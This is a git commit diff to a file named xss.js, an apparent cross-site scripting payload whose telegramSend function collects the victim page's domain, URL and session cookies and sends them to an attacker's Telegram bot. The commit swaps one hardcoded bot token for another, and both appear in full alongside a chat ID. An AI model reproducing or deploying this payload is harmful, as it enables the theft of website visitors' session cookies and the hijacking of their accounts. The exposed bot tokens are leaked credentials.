314e6c2d0b584c05af2d155cac33394e7118e1a1
Syukirman Amir <128995740+syukirman-amir@users.noreply.github.com>
2024-04-27 13:11:35 +0900

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,5 +1,6 @@
-var tokenBot = '7043468421:AAELoNUXP7iQ2ShMBCC7zr6fbmJavy8yQP0'; // Your "tokenBot" Here
+var tokenBot = '6299530694:AAGQ4i4FThkwbr51cZZnL-Pt69uYa8EiW98'; // Your "tokenBot" Here
 var chatId = '480631913'; // Your "chatId" Here
+
 function telegramSend(tokenBot, chatId) {
 	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
     var xhr = new XMLHttpRequest();
